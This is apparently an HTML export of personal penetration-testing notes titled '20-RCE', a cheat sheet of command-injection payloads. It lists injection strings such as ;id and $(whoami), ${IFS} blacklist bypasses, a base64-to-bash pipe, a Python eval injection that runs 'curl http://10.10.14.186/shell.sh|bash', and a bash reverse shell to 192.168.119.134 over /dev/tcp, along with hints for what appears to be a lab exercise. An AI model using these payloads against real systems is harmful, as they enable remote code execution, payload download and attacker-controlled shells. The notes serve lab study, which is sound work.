<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>20-RCE</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>20-RCE</h1><br/><p><ul><li>payload<ul><li><a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></li></ul></li><li>example<ul><li>;id</li><li>|id </li><li>%3Bwhoami</li><li>$(whoami)</li></ul></li><li>Space bypass<ul><li>$({uname,-a})</li></ul></li><li><h3>  ;ls</h3></li><li><h3> &amp;&amp; ls</h3></li></ul><h3></h3></p><p><h3> ◇ ||ls</h3><h3></h3></p><p><h3> ◇ $(whoami)</h3><h3></h3></p><p><h3> ◇ Bypass techniques (blacklist)</h3><h3></h3></p><p><h3> </h3>◇ <h3>▪ ${IFS} for space </h3></p><p> <strong>;echo${IFS}&quot;[ PAYLOAD ]&quot;|base64${IFS}-d|bash;</strong></p><p><h2> Command injection Web bash</h2><strong><h3> </h3></strong><h3></h3></p><p><h3> `echo &lt;base64_payload&gt; |base64 -d | bash`</h3></p><p></p><p></p><p><strong><h2>Python RCE</h2></strong><ul><li>eval =&gt; <a href="https://www.youtube.com/watch?v=psFXtnoO5xk">https://www.youtube.com/watch?v=psFXtnoO5xk</a><ul><li><a href="https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html">https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html</a></li></ul></li><li></li></ul><div class="codebox"><pre>http:<span style="color:#ff9d00;font-weight:700">//</span>127.0.0.1<span style="color:#ff9d00;font-weight:700">/</span>debug<span style="color:#3ad900;font-weight:400">&#39; eval(compile(&#39;</span>for x in range<span style="color:#ff9d00;font-weight:700">(</span>1<span style="color:#ff9d00;font-weight:700">)</span>:<span style="color:#333333;font-weight:400">\n</span> import os<span style="color:#333333;font-weight:400">\n</span> os.system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;curl http://10.10.14.186/shell.sh|bash&quot;</span><span style="color:#ff9d00;font-weight:700">)</span><span style="color:#3ad900;font-weight:400">&#39;,&#39;</span>a<span style="color:#3ad900;font-weight:400">&#39;,&#39;</span>single<span style="color:#3ad900;font-weight:400">&#39;)) &#39;</span></pre></div></p><p></p><p></p><p></p><p><h2>O hints Q3</h2><ul><li>Try dirbusting until you find Future Factor Authentication (FFA) application.</li></ul></p><p>You may assume that a vulnerable function such as eval() or popen() was used on the back-end: popen(f&#39;echo \&quot;ls\&quot;)\</p><p>You may need to pay attention to how you are closing the statement with double-quotes/single quote.\n\nFor obtaining a reverse shell, payloads that utilize bash shell might be great candidates.</p><p><ul><li>test &quot;;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.119.134/443 0&gt;&amp;1&#39;&quot;</li></ul></p><p></p><p><h2>Python RCE</h2><ul><li>https://semgrep.dev/docs/cheat-sheets/python-command-injection/</li></ul></p></div>
</body>
</html>
